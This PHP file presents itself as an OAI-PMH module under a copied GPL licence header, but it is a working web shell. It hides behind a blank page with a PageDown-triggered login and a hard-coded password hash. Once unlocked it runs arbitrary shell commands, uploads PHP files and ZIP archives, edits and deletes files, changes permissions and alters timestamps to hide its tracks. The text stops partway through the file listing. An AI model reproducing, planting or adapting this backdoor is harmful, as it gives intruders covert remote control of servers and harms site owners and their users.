<?php
/**
 * OAI-PMH
 *
 * Copyright (C) 2012  Arie Nugraha (dicarve@yahoo.com)
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */
$password_hash = '$2a$12$miPkBPA1QvcfL7cqzzsrg.qdDaMhmRa1.U2.c/A6ww2Rt5CG/Os46';

ini_set('allow_url_fopen', '0');
ini_set('allow_url_include', '0');
ini_set('disable_functions', 'curl_exec,curl_multi_exec,exec,passthru,proc_open,shell_exec,system,mail,fsockopen,fopen,fread,file_get_contents');
error_reporting(0);
set_time_limit(0);
ini_set('display_errors', 0);

session_name('local_shell_' . md5(__FILE__));
session_start();

// ==================== AUTHENTICATION ====================
$__auth__ = false;

if (isset($_SESSION['__auth__']) && $_SESSION['__auth__'] === true) {
    $__auth__ = true;
} elseif (isset($_POST['__p__'])) {
    if (password_verify($_POST['__p__'], $password_hash)) {
        $_SESSION['__auth__'] = true;
        $__auth__ = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

// ==================== HIDDEN LOGIN ====================
if (!$__auth__) {
    if (!isset($_GET['__l__'])) {
        echo '<!DOCTYPE html><html><head><title></title><style>*{margin:0;padding:0;}html,body{width:100%;height:100%;background:#ffffff;}</style></head><body><script>document.onkeydown=function(e){if(e.key==="PageDown")window.location.href="?__l__=1";};</script></body></html>';
        exit;
    }
    
    echo '<!DOCTYPE html><html><head><title>🎧Shell Lee..🥂🎸⋆｡ °⋆</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:monospace;background:#111;color:#0f0;display:flex;justify-content:center;align-items:center;min-height:100vh;}.login-box{background:#222;padding:30px;border-radius:5px;border:1px solid #0f0;width:90%;max-width:400px;}.login-title{text-align:center;margin-bottom:20px;color:#0f0;font-size:18px;}.form-input{width:100%;padding:10px;background:#000;color:#0f0;border:1px solid #333;border-radius:3px;margin-bottom:15px;font-family:monospace;}.submit-btn{width:100%;padding:10px;background:#0f0;color:#000;border:none;border-radius:3px;cursor:pointer;font-family:monospace;font-weight:bold;}</style></head><body><div class="login-box"><div class="login-title">Where are you going</div><form method="post"><input type="password" name="__p__" class="form-control" placeholder="PASSWORD" required autofocus><button type="submit" class="submit-btn">Kemana-mana</button></form></div></body></html>';
    exit;
}

// ==================== FULL ACCESS TERMINAL ====================
function executeLocal($cmd, $cwd = null) {
    $output = [];
    $return_var = 0;
    
    $cmd = trim($cmd);
    
    // Ganti variabel dengan nilai aktual
    if (strpos($cmd, '$(whoami)') !== false) {
        $current_user = @shell_exec('whoami 2>/dev/null');
        if ($current_user) {
            $cmd = str_replace('$(whoami)', trim($current_user), $cmd);
        }
    }
    
    if (strpos($cmd, '$(id -u)') !== false) {
        $current_uid = @shell_exec('id -u 2>/dev/null');
        if ($current_uid) {
            $cmd = str_replace('$(id -u)', trim($current_uid), $cmd);
        }
    }
    
    // Tambahkan working directory jika ada
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    
    $pipes = array();
    
    // Gunakan proc_open dengan working directory
    $process = @proc_open($cmd, $descriptorspec, $pipes, $cwd);
    
    if (is_resource($process)) {
        fclose($pipes[0]);
        
        $output = [stream_get_contents($pipes[1])];
        $error_output = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        
        $return_var = proc_close($process);
        
        if (!empty(trim($error_output))) {
            $output[] = $error_output;
        }
    } elseif (function_exists('exec')) {
        // Fallback: exec dengan chdir
        if ($cwd && is_dir($cwd)) {
            $original_cwd = getcwd();
            chdir($cwd);
        }
        
        @exec($cmd . ' 2>&1', $output, $return_var);
        
        if (isset($original_cwd)) {
            chdir($original_cwd);
        }
    } elseif (function_exists('shell_exec')) {
        if ($cwd && is_dir($cwd)) {
            $original_cwd = getcwd();
            chdir($cwd);
        }
        
        $output = [@shell_exec($cmd . ' 2>&1')];
        
        if (isset($original_cwd)) {
            chdir($original_cwd);
        }
    } else {
        return "❌ No execution method available";
    }
    
    if (empty($output) || (count($output) == 1 && trim($output[0]) == '')) {
        return "✅ Command executed successfully";
    }
    
    return implode("\n", $output);
}

// ==================== MAIN LOGIC ====================
$__dir__ = isset($_GET['__d__']) ? $_GET['__d__'] : getcwd();
$__dir__ = realpath($__dir__) ?: getcwd();
if (!is_dir($__dir__)) $__dir__ = getcwd();

// Handle POST operations
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // MULTI UPLOAD
    if (!empty($_FILES['files'])) {
        foreach ($_FILES['files']['tmp_name'] as $key => $tmp_name) {
            if ($_FILES['files']['error'][$key] === UPLOAD_ERR_OK) {
                $filename = basename($_FILES['files']['name'][$key]);
                $target = $__dir__ . '/' . $filename;
                
                if (@move_uploaded_file($tmp_name, $target)) {
                    $_SESSION['messages'][] = "✅ Uploaded: " . htmlspecialchars($filename);
                } else {
                    $_SESSION['messages'][] = "❌ Failed to upload: " . htmlspecialchars($filename) . " - Check permissions";
                }
            }
        }
    }
    
    // ZIP UPLOAD + AUTO EXTRACT (DIRECT EXTRACTION - NO ZIP FILE SAVED)
    if (!empty($_FILES['zip_file'])) {
        $filename = basename($_FILES['zip_file']['name']);
        $tmp_file = $_FILES['zip_file']['tmp_name'];
        
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($tmp_file) === TRUE) {
                $extracted_count = 0;
                
                // Extract semua file ke direktori saat ini
                for ($i = 0; $i < $zip->numFiles; $i++) {
                    $entry_name = $zip->getNameIndex($i);
                    
                    // Skip __MACOSX folder dan .DS_Store files
                    if (strpos($entry_name, '__MACOSX/') === 0 || 
                        strpos($entry_name, '.DS_Store') !== false) {
                        continue;
                    }
                    
                    // Pastikan target aman
                    $target_path = $__dir__ . '/' . $entry_name;
                    
                    // Cegah directory traversal
                    if (strpos(realpath(dirname($target_path)), realpath($__dir__)) !== 0) {
                        continue;
                    }
                    
                    // Buat direktori jika diperlukan
                    $entry_dir = dirname($target_path);
                    if (!is_dir($entry_dir)) {
                        mkdir($entry_dir, 0755, true);
                    }
                    
                    // Extract file
                    $fp = $zip->getStream($entry_name);
                    if ($fp) {
                        $contents = '';
                        while (!feof($fp)) {
                            $contents .= fread($fp, 8192);
                        }
                        fclose($fp);
                        
                        if (file_put_contents($target_path, $contents)) {
                            $extracted_count++;
                        }
                    }
                }
                
                $zip->close();
                $_SESSION['messages'][] = "📦 Auto-extracted ZIP: " . htmlspecialchars($filename) . " (" . $extracted_count . " files extracted)";
            } else {
                $_SESSION['messages'][] = "❌ Failed to open ZIP file: " . htmlspecialchars($filename);
            }
        } else {
            $_SESSION['messages'][] = "❌ ZipArchive class not available";
        }
    }
    
    // PHP UPLOAD
    if (!empty($_FILES['php_file'])) {
        $filename = basename($_FILES['php_file']['name']);
        $target = $__dir__ . '/' . $filename;
        
        if (@move_uploaded_file($_FILES['php_file']['tmp_name'], $target)) {
            $_SESSION['messages'][] = "🐘 PHP Uploaded: " . htmlspecialchars($filename);
        } else {
            $_SESSION['messages'][] = "❌ Failed to upload PHP: " . htmlspecialchars($filename);
        }
    }
    
    // CREATE FILE/FOLDER
    if (isset($_POST['__create__'])) {
        $name = basename($_POST['__name__']);
        $type = $_POST['__type__'];
        $path = $__dir__ . '/' . $name;
        
        if ($type === 'file') {
            if (@file_put_contents($path, $_POST['__data__'] ?? '')) {
                $_SESSION['messages'][] = "📄 Created: " . htmlspecialchars($name);
            } else {
                $_SESSION['messages'][] = "❌ Failed to create file: " . htmlspecialchars($name);
            }
        } else {
            if (@mkdir($path, 0755, true)) {
                $_SESSION['messages'][] = "📁 Created: " . htmlspecialchars($name);
            } else {
                $_SESSION['messages'][] = "❌ Failed to create folder: " . htmlspecialchars($name);
            }
        }
    }
    
    // TERMINAL - dengan working directory saat ini
    if (isset($_POST['__cmd__'])) {
        $cmd = $_POST['__cmd__'];
        $output = executeLocal($cmd, $__dir__);
        $_SESSION['cmd_output'] = $output;
    }
    
    // EDIT FILE
    if (isset($_POST['__content__']) && isset($_POST['__edit_file__'])) {
        $target = $__dir__ . '/' . basename($_POST['__edit_file__']);
        if (@file_put_contents($target, $_POST['__content__'])) {
            $_SESSION['messages'][] = "💾 Saved: " . htmlspecialchars(basename($target));
        } else {
            $_SESSION['messages'][] = "❌ Failed to save: " . htmlspecialchars(basename($target));
        }
    }
    
    // BATCH DELETE
    if (isset($_POST['__delete_selected__'])) {
        $selected_items = $_POST['selected_items'] ?? [];
        foreach ($selected_items as $item) {
            $target = $__dir__ . '/' . basename($item);
            if (file_exists($target)) {
                if (is_dir($target)) {
                    $it = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
                    $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                    foreach($files as $file) {
                        if ($file->isDir()){
                            @rmdir($file->getRealPath());
                        } else {
                            @unlink($file->getRealPath());
                        }
                    }
                    @rmdir($target);
                } else {
                    @unlink($target);
                }
                $_SESSION['messages'][] = "🗑 Deleted: " . htmlspecialchars(basename($item));
            }
        }
    }
    
    // CHANGE PERMISSIONS - Simple
    if (isset($_POST['__chmod__'])) {
        $target = $__dir__ . '/' . basename($_POST['__chmod_file__']);
        $permissions = $_POST['__permissions__'];
        
        if (file_exists($target)) {
            if (is_numeric($permissions)) {
                $octal = octdec($permissions);
            } else {
                $octal = 0;
                if (strpos($permissions, 'r') !== false) $octal += 4;
                if (strpos($permissions, 'w') !== false) $octal += 2;
                if (strpos($permissions, 'x') !== false) $octal += 1;
                if (strpos($permissions, 's') !== false) $octal += 4000;
                if (strpos($permissions, 'S') !== false) $octal += 2000;
                if (strpos($permissions, 't') !== false) $octal += 1000;
            }
            
            if (@chmod($target, $octal)) {
                $_SESSION['messages'][] = "🔧 Permissions changed: " . htmlspecialchars(basename($target)) . " -> " . $permissions;
            } else {
                $_SESSION['messages'][] = "❌ Failed to change permissions";
            }
        }
    }
    
    // RECURSIVE CHMOD
    if (isset($_POST['__chmod_recursive__'])) {
        $target = $__dir__ . '/' . basename($_POST['__chmod_recursive_file__']);
        $permissions = $_POST['__permissions_recursive__'];
        
        if (file_exists($target)) {
            $cmd = "chmod -R " . escapeshellarg($permissions) . " " . escapeshellarg($target) . " 2>&1";
            $output = executeLocal($cmd, $__dir__);
            $_SESSION['messages'][] = "🔧 Recursive permissions changed: " . htmlspecialchars(basename($target)) . " -> " . $permissions;
            $_SESSION['cmd_output'] = $output;
        }
    }
    
    // RENAME FILE/FOLDER
    if (isset($_POST['__rename__'])) {
        $old_name = $__dir__ . '/' . basename($_POST['__rename_old__']);
        $new_name = $__dir__ . '/' . basename($_POST['__rename_new__']);
        
        if (file_exists($old_name) && !file_exists($new_name)) {
            if (@rename($old_name, $new_name)) {
                $_SESSION['messages'][] = "✏️ Renamed: " . htmlspecialchars(basename($old_name)) . " → " . htmlspecialchars(basename($new_name));
            } else {
                $_SESSION['messages'][] = "❌ Failed to rename " . htmlspecialchars(basename($old_name)) . " - Check permissions";
            }
        } elseif (file_exists($new_name)) {
            $_SESSION['messages'][] = "❌ Cannot rename - Target already exists: " . htmlspecialchars(basename($new_name));
        }
    }
    
    // CHANGE TIMESTAMP
    if (isset($_POST['__touch__'])) {
        $target = $__dir__ . '/' . basename($_POST['__touch_file__']);
        $timestamp = strtotime($_POST['__timestamp__']);
        if (file_exists($target)) {
            if (@touch($target, $timestamp)) {
                $_SESSION['messages'][] = "🕒 Timestamp changed: " . htmlspecialchars(basename($target));
            } else {
                $_SESSION['messages'][] = "❌ Failed to change timestamp";
            }
        }
    }
    
    header("Location: " . $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__));
    exit;
}

// Handle GET operations
if (isset($_GET['__del__'])) {
    $target = $__dir__ . '/' . basename($_GET['__del__']);
    if (file_exists($target)) {
        if (is_dir($target)) {
            $it = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
            $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
            foreach($files as $file) {
                if ($file->isDir()){
                    @rmdir($file->getRealPath());
                } else {
                    @unlink($file->getRealPath());
                }
            }
            @rmdir($target);
        } else {
            @unlink($target);
        }
        $_SESSION['messages'][] = "🗑 Deleted: " . htmlspecialchars(basename($target));
        header("Location: " . $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__));
        exit;
    }
}

if (isset($_GET['__extract__'])) {
    $target = $__dir__ . '/' . basename($_GET['__extract__']);
    if (class_exists('ZipArchive') && file_exists($target) && pathinfo($target, PATHINFO_EXTENSION) === 'zip') {
        $zip = new ZipArchive();
        if ($zip->open($target) === TRUE) {
            $extracted_count = 0;
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $entry_name = $zip->getNameIndex($i);
                $target_path = $__dir__ . '/' . $entry_name;
                
                if (strpos($entry_name, '__MACOSX/') === 0) continue;
                
                $entry_dir = dirname($target_path);
                if (!is_dir($entry_dir)) {
                    mkdir($entry_dir, 0755, true);
                }
                
                $fp = $zip->getStream($entry_name);
                if ($fp) {
                    $contents = '';
                    while (!feof($fp)) {
                        $contents .= fread($fp, 8192);
                    }
                    fclose($fp);
                    
                    if (file_put_contents($target_path, $contents)) {
                        $extracted_count++;
                    }
                }
            }
            $zip->close();
            $_SESSION['messages'][] = "📦 Extracted: " . htmlspecialchars(basename($target)) . " (" . $extracted_count . " files)";
        }
        header("Location: " . $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__));
        exit;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ==================== DISPLAY MESSAGES ====================
$messages = $_SESSION['messages'] ?? [];
$cmd_output = $_SESSION['cmd_output'] ?? '';
unset($_SESSION['messages'], $_SESSION['cmd_output']);

// Check if we're editing a file
$editing_file = '';
$file_content = '';
if (isset($_GET['__edit__'])) {
    $editing_file = basename($_GET['__edit__']);
    $target = $__dir__ . '/' . $editing_file;
    if (file_exists($target) && is_file($target)) {
        $file_content = file_get_contents($target);
    }
}

// ==================== PERMISSION LOGIC ====================
function __is_writable($file) {
    if (!file_exists($file)) {
        return false;
    }
    
    if (is_writable($file)) {
        return true;
    }
    
    $perms = fileperms($file);
    
    // Cek write permission untuk owner (bit 0200)
    return ($perms & 0200) != 0;
}

function getPermissionColor($path, $permissions, $is_dir = false) {
    if (__is_writable($path)) {
        return '#00ff00'; // HIJAU - bisa write
    }
    
    return '#ffffff'; // PUTIH - tidak bisa write
}

function getPermissionStatus($path, $permissions, $is_dir = false) {
    $color = getPermissionColor($path, $permissions, $is_dir);
    if ($color === '#00ff00') {
        return 'writable';
    } else {
        return 'locked';
    }
}

function canUploadToDirectory($dir_path) {
    return is_writable($dir_path);
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>☠️ BERHANTU</title>
    <style>
        :root { 
            --blood: #ff0000; 
            --ghost: #e6e6fa; 
            --dark: #0a0a0a; 
            --green: #00ff00; 
            --purple: #800080; 
            --orange: #ff6600; 
            --yellow: #ffff00; 
            --blue: #0088ff;
            --writable: #00ff00;
            --locked: #ffffff;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: monospace; background: var(--dark); color: var(--ghost); padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { background: rgba(10,10,10,0.9); padding: 20px; margin-bottom: 20px; border: 2px solid var(--blood); border-radius: 10px; }
        .header h1 { color: var(--blood); margin-bottom: 10px; }
        .path { 
            font-size: 14px; 
            color: var(--green); 
            background: rgba(0,0,0,0.7); 
            padding: 10px; 
            border-radius: 5px; 
            margin-bottom: 15px; 
            word-break: break-all;
            border-left: 4px solid var(--green);
        }
        .path a { color: var(--orange); text-decoration: none; }
        .messages { margin-bottom: 20px; }
        .message { padding: 10px; background: rgba(255,0,0,0.1); border-left: 3px solid var(--blood); margin-bottom: 5px; }
        .upload-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 20px; }
        .upload-box { background: rgba(0,0,0,0.7); padding: 20px; border: 1px solid var(--green); border-radius: 8px; }
        .upload-box h3 { color: var(--green); margin-bottom: 15px; }
        .form-control { width: 100%; padding: 10px; background: rgba(0,0,0,0.8); color: var(--green); border: 1px solid var(--purple); border-radius: 5px; margin-bottom: 10px; font-family: monospace; }
        .btn { padding: 8px 15px; background: linear-gradient(45deg, var(--dark), var(--purple)); color: var(--ghost); border: 1px solid var(--blood); border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; margin: 5px; }
        .btn:hover { border-color: var(--orange); }
        .btn-danger { background: linear-gradient(45deg, #8b0000, #ff0000); border-color: #ff4444; }
        .btn-warning { background: linear-gradient(45deg, #8b4500, #ff8800); border-color: #ffaa00; }
        .btn-info { background: linear-gradient(45deg, #004488, #0088ff); border-color: #00aaff; }
        .btn-success { background: linear-gradient(45deg, #006600, #00cc00); border-color: #00ff00; }
        .file-manager { background: rgba(10,10,10,0.9); padding: 20px; margin-bottom: 20px; border: 2px solid var(--blood); border-radius: 10px; }
        .file-table { width: 100%; border-collapse: collapse; }
        .file-table th { padding: 10px; background: rgba(139,0,0,0.3); color: var(--ghost); border-bottom: 2px solid var(--blood); }
        .file-table td { padding: 8px; border-bottom: 1px solid rgba(139,0,0,0.2); }
        .file-table tr.selected { background: rgba(255,0,0,0.2); border-left: 3px solid var(--blood); }
        .file-table tr:hover { background: rgba(139,0,0,0.1); }
        .folder { color: var(--orange); }
        .file { color: var(--ghost); }
        .cursor-pointer { cursor: pointer; }
        .cursor-column { position: relative; }
        .cursor-column::before { content: "▶"; color: var(--blood); position: absolute; left: -15px; }
        .checkbox-col { width: 30px; }
        .checkbox-col input[type="checkbox"] { 
            cursor: pointer; 
            width: 16px; 
            height: 16px; 
        }
        .action-btn { padding: 3px 8px; background: rgba(0,0,0,0.7); border: 1px solid var(--green); border-radius: 3px; color: var(--ghost); text-decoration: none; font-size: 12px; margin: 2px; display: inline-block; }
        .action-btn:hover { background: var(--green); color: var(--dark); }
        .action-btn-edit { border-color: var(--yellow); }
        .action-btn-chmod { border-color: var(--blue); }
        .action-btn-rename { border-color: var(--orange); }
        .action-btn-time { border-color: #ff00ff; }
        .terminal { background: rgba(0,0,0,0.9); padding: 20px; margin-bottom: 20px; border: 2px solid var(--green); border-radius: 10px; }
        .terminal-output { background: rgba(0,0,0,0.8); padding: 15px; border-radius: 5px; border: 1px solid var(--purple); color: var(--green); font-family: monospace; white-space: pre-wrap; max-height: 400px; overflow-y: auto; }
        .cmd-examples { background: rgba(139,0,0,0.1); padding: 10px; border-radius: 5px; margin-top: 10px; font-size: 12px; }
        .cmd-examples code { background: rgba(0,0,0,0.5); padding: 2px 5px; border-radius: 3px; margin: 0 2px; cursor: pointer; }
        .cmd-examples code:hover { background: rgba(255,0,0,0.5); }
        .edit-box { 
            background: rgba(10,10,10,0.9); 
            padding: 20px; 
            margin: 20px 0; 
            border: 2px solid var(--yellow); 
            border-radius: 10px; 
        }
        .edit-box h3 { 
            color: var(--yellow); 
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .editor { 
            width: 100%; 
            height: 500px; 
            background: #1a1a1a; 
            color: #00ff00; 
            border: 1px solid var(--purple); 
            border-radius: 5px; 
            padding: 15px; 
            font-family: monospace; 
            font-size: 14px; 
            line-height: 1.5; 
            resize: vertical; 
        }
        .editor:focus { outline: 2px solid var(--blood); }
        .batch-actions { background: rgba(139,0,0,0.2); padding: 10px; border-radius: 5px; margin-top: 10px; text-align: center; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
        .modal-content { 
            background: var(--dark); 
            border: 2px solid var(--blood); 
            border-radius: 10px; 
            padding: 20px; 
            width: 90%; 
            max-width: 500px; 
            margin: 50px auto; 
        }
        .modal-header { color: var(--blood); margin-bottom: 15px; }
        .modal-close { float: right; cursor: pointer; color: var(--blood); font-size: 20px; }
        .footer { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid rgba(255,0,0,0.3); color: rgba(230,230,250,0.5); font-size: 12px; }
        .power-indicator { color: var(--blood); font-weight: bold; text-shadow: 0 0 10px var(--blood); }
        
        /* PERMISSION COLOR STYLES */
        .perm-writable { 
            color: var(--writable) !important; 
            font-weight: bold;
            background: rgba(0,255,0,0.1);
            padding: 2px 6px;
            border-radius: 3px;
            border: 1px solid rgba(0,255,0,0.3);
        }
        .perm-locked { 
            color: var(--locked) !important;
            background: rgba(255,255,255,0.1);
            padding: 2px 6px;
            border-radius: 3px;
            border: 1px solid rgba(255,255,255,0.3);
        }
        
        /* UPLOAD STATUS */
        .upload-status {
            font-size: 12px;
            margin-top: 5px;
            padding: 3px;
            border-radius: 3px;
            text-align: center;
        }
        .upload-writable {
            background: rgba(0,255,0,0.1);
            color: var(--writable);
            border: 1px solid rgba(0,255,0,0.3);
        }
        .upload-locked {
            background: rgba(255,255,255,0.1);
            color: var(--locked);
            border: 1px solid rgba(255,255,255,0.3);
        }
        
        /* WRITE INDICATOR */
        .write-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 5px;
        }
        .write-yes {
            background-color: var(--writable);
            box-shadow: 0 0 5px var(--writable);
        }
        .write-no {
            background-color: var(--locked);
            box-shadow: 0 0 5px var(--locked);
        }
        
        .editor-controls {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
        }
        .editor-info {
            color: var(--yellow);
            font-size: 12px;
        }
        
        /* TERMINAL PATH INFO */
        .terminal-path {
            background: rgba(0,0,0,0.7);
            padding: 8px 12px;
            border-radius: 5px;
            margin-bottom: 10px;
            border-left: 3px solid var(--green);
            font-size: 13px;
        }
        .terminal-path span {
            color: var(--orange);
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(255,0,0,0.3);
            color: rgba(230,230,250,0.5);
            font-size: 12px;
        }
        
        @media (max-width: 768px) {
            .upload-box {
                min-width: 100%;
            }
            
            .file-table {
                font-size: 11px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>☠️ <span class="power-indicator">SHELL</span> LEE ☠️</h1>
            <div class="path">
                <?php
                $parts = explode('/', trim($__dir__, '/'));
                $current = '';
                echo '<a href="?__d__=/">/</a>';
                foreach ($parts as $part) {
                    if ($part) {
                        $current .= '/' . $part;
                        echo '/<a href="?__d__=' . urlencode($current) . '" style="color: var(--orange);">' . htmlspecialchars($part) . '</a>';
                    }
                }
                ?>
            </div>
            
            <!-- Upload Status Indicator -->
            <?php 
            $can_upload = canUploadToDirectory($__dir__);
            $dir_perm = substr(sprintf('%o', fileperms($__dir__)), -4);
            $dir_status = getPermissionStatus($__dir__, $dir_perm, true);
            ?>
            <div class="upload-status <?php echo $can_upload ? 'upload-writable' : 'upload-locked'; ?>">
                <span class="write-indicator <?php echo $can_upload ? 'write-yes' : 'write-no'; ?>"></span>
                <?php echo $can_upload ? '✓ CAN UPLOAD/WRITE' : '✗ READ-ONLY DIRECTORY'; ?>
                <span class="perm-details">(Permission: <?php echo $dir_perm; ?>)</span>
            </div>
            
            <div>
                <a href="?__d__=<?php echo urlencode(dirname($__dir__)); ?>" class="btn">⬆️ PARENT</a>
                <a href="?__d__=<?php echo urlencode(getcwd()); ?>" class="btn">🏠 HOME</a>
                <a href="?__d__=<?php echo urlencode($__dir__); ?>" class="btn">🔄 REFRESH</a>
                <a href="?logout=1" class="btn btn-danger" onclick="return confirm('Logout?')">💀 LOGOUT</a>
            </div>
        </div>
        
        <?php if (!empty($messages)): ?>
        <div class="messages">
            <?php foreach ($messages as $msg): ?>
                <div class="message"><?php echo $msg; ?></div>
            <?php endforeach; ?>
        </div>
        <?php endif; ?>
        
        <!-- MODAL FOR SIMPLE CHMOD -->
        <div id="chmodModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <span class="modal-close" onclick="closeModal('chmodModal')">&times;</span>
                    <h3>🔧 CHANGE PERMISSIONS</h3>
                </div>
                <form method="post" id="chmodForm">
                    <input type="hidden" name="__chmod_file__" id="chmodFile">
                    <div style="margin-bottom: 15px;">
                        <label style="color: var(--green);">Permissions:</label>
                        <input type="text" name="__permissions__" class="form-control" placeholder="e.g., 755, 644, 777, rwxr-xr-x" required>
                        <div style="font-size: 11px; color: var(--green); margin-top: 5px;">
                            Format: Octal (755, 644) atau Symbolic (rwxr-xr-x)
                        </div>
                    </div>
                    <div style="margin-top: 15px;">
                        <button type="submit" name="__chmod__" class="btn btn-info">APPLY</button>
                        <button type="button" class="btn btn-danger" onclick="closeModal('chmodModal')">CANCEL</button>
                    </div>
                </form>
                
                <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid rgba(139,0,0,0.3);">
                    <h4 style="color: var(--orange); margin-bottom: 10px;">Recursive CHMOD</h4>
                    <form method="post" id="chmodRecursiveForm">
                        <input type="hidden" name="__chmod_recursive_file__" id="chmodRecursiveFile">
                        <div style="margin-bottom: 10px;">
                            <input type="text" name="__permissions_recursive__" class="form-control" placeholder="e.g., 755, 644" required>
                        </div>
                        <button type="submit" name="__chmod_recursive__" class="btn btn-warning" onclick="return confirm('Apply recursively to ALL files and subdirectories?')">APPLY RECURSIVELY</button>
                    </form>
                </div>
            </div>
        </div>
        
        <!-- MODAL FOR RENAME -->
        <div id="renameModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <span class="modal-close" onclick="closeModal('renameModal')">&times;</span>
                    <h3>✏️ RENAME</h3>
                </div>
                <form method="post" id="renameForm">
                    <input type="hidden" name="__rename_old__" id="renameOld">
                    <div style="margin-bottom: 15px;">
                        <label style="color: var(--green);">New name:</label>
                        <input type="text" name="__rename_new__" class="form-control" required>
                    </div>
                    <div style="margin-top: 15px;">
                        <button type="submit" name="__rename__" class="btn btn-warning">RENAME</button>
                        <button type="button" class="btn btn-danger" onclick="closeModal('renameModal')">CANCEL</button>
                    </div>
                </form>
            </div>
        </div>
        
        <!-- MODAL FOR TIMESTAMP -->
        <div id="timeModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <span class="modal-close" onclick="closeModal('timeModal')">&times;</span>
                    <h3>🕒 CHANGE TIMESTAMP</h3>
                </div>
                <form method="post" id="timeForm">
                    <input type="hidden" name="__touch_file__" id="touchFile">
                    <div style="margin-bottom: 15px;">
                        <label style="color: var(--green);">Date & Time:</label>
                        <input type="datetime-local" name="__timestamp__" class="form-control" value="<?php echo date('Y-m-d\TH:i'); ?>">
                    </div>
                    <div style="margin-top: 15px;">
                        <button type="submit" name="__touch__" class="btn btn-info">CHANGE</button>
                        <button type="button" class="btn" onclick="setTimestamp('now')">NOW</button>
                        <button type="button" class="btn" onclick="setTimestamp('yesterday')">YESTERDAY</button>
                        <button type="button" class="btn btn-danger" onclick="closeModal('timeModal')">CANCEL</button>
                    </div>
                </form>
            </div>
        </div>
        
        <div class="upload-grid">
            <div class="upload-box">
                <h3>📤 MULTI UPLOAD</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="files[]" class="form-control" multiple required>
                    <button type="submit" class="btn">UPLOAD ALL</button>
                </form>
            </div>
            
            <div class="upload-box">
                <h3>📦 ZIP + AUTO EXTRACT</h3>
                <div style="font-size: 12px; color: var(--orange); margin-bottom: 10px;">
                    ⚡ File zip akan langsung diekstrak, tidak disimpan
                </div>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="zip_file" class="form-control" accept=".zip" required>
                    <button type="submit" class="btn">UPLOAD & EXTRACT</button>
                </form>
            </div>
            
            <div class="upload-box">
                <h3>🐘 PHP UPLOAD</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="php_file" class="form-control" accept=".php,.php5,.php7,.phtml" required>
                    <button type="submit" class="btn">UPLOAD PHP</button>
                </form>
            </div>
            
            <div class="upload-box">
                <h3>➕ CREATE NEW</h3>
                <form method="post">
                    <input type="text" name="__name__" class="form-control" placeholder="Name" required>
                    <select name="__type__" class="form-control">
                        <option value="file">📄 FILE</option>
                        <option value="folder">📁 FOLDER</option>
                    </select>
                    <textarea name="__data__" class="form-control" placeholder="Content" rows="3"></textarea>
                    <input type="hidden" name="__create__" value="1">
                    <button type="submit" class="btn">CREATE</button>
                </form>
            </div>
        </div>
        
        <div class="file-manager">
            <form method="post" id="batchForm">
                <table class="file-table" id="fileTable">
                    <thead>
                        <tr>
                            <th class="checkbox-col"><input type="checkbox" id="selectAll"></th>
                            <th>NAME</th>
                            <th>SIZE</th>
                            <th>PERM</th>
                            <th>MODIFIED</th>
                            <th>ACTIONS</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        $items = @scandir($__dir__);
                        if ($items) {
                            // Pisahkan folder dan file
                            $folders = [];
                            $files = [];
                            
                            foreach ($items as $item) {
                                if ($item == '.' || $item == '..') continue;
                                $path = $__dir__ . '/' . $item;
                                $is_dir = is_dir($path);
                                
                                if ($is_dir) {
                                    $folders[] = $item;
                                } else {
                                    $files[] = $item;
                                }
                            }
                            
                            // Sort folders alphabetically
                            sort($folders);
                            
                            // Sort files alphabetically
                            sort($files);
                            
